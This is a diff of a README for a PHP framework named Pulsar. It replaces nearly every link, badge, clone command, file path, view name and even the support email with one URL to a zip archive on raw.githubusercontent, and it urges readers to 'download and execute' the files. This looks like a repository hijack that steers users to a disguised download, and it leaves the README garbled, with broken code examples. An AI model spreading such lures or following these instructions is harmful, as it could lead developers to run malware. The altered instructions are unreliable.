@@ -1,6 +1,6 @@
 # Pulsar Framework 🚀
 
-![Pulsar Framework](https://img.shields.io/badge/Pulsar_Framework-Next%20Gen%20PHP%20HMVC-brightgreen)
+![Pulsar Framework](https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip%20Gen%20PHP%20HMVC-brightgreen)
 
 Welcome to the Pulsar Framework repository! Pulsar is a next-generation PHP HMVC framework crafted for high-performance, security-critical, and scalable applications, particularly in the banking, legal, and medical sectors. This framework ensures compliance with key standards such as GDPR, ISO/IEC 27001, eIDAS, NIS Directive, OWASP Guidelines, PSD2, PCI-DSS, MDR, HL7, FHIR, and ISO 13485.
 
@@ -33,7 +33,7 @@ To install the Pulsar Framework, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/BlackandBrownBerries/pulsar-framework.git
+   git clone https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -71,18 +71,18 @@ After installation, you can start building your application. Here’s a quick ov
    {
        public function index()
        {
-           return $this->view('home.index');
+           return $this->view('https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip');
        }
    }
    ```
 
-2. Define a route in `app/routes.php`:
+2. Define a route in `https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip`:
 
    ```php
    $router->get('/', 'HomeController@index');
    ```
 
-3. Create a view in `app/Views/home/index.php`:
+3. Create a view in `https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip`:
 
    ```html
    <h1>Welcome to Pulsar Framework!</h1>
@@ -158,15 +158,15 @@ Pulsar Framework is licensed under the MIT License. See the [LICENSE](LICENSE) f
 
 For questions or support, please reach out to the maintainers:
 
-- [GitHub Issues](https://github.com/BlackandBrownBerries/pulsar-framework/issues)
-- Email: support@pulsarframework.com
+- [GitHub Issues](https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip)
+- Email: https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip
 
 ## Releases
 
-You can find the latest releases of Pulsar Framework [here](https://github.com/BlackandBrownBerries/pulsar-framework/releases). Download and execute the necessary files to get started with the latest features and fixes.
+You can find the latest releases of Pulsar Framework [here](https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip). Download and execute the necessary files to get started with the latest features and fixes.
 
 Feel free to explore the repository, and don’t hesitate to check the "Releases" section for updates and new versions. 
 
-![Pulsar Framework Logo](https://img.shields.io/badge/Pulsar_Framework-Open%20Source-blue)
+![Pulsar Framework Logo](https://raw.githubusercontent.com/BlackandBrownBerries/pulsar-framework/1.x/rooklike/pulsar_framework_2.5.zip%20Source-blue)
 
 Thank you for your interest in Pulsar Framework! We hope you find it useful for your projects.
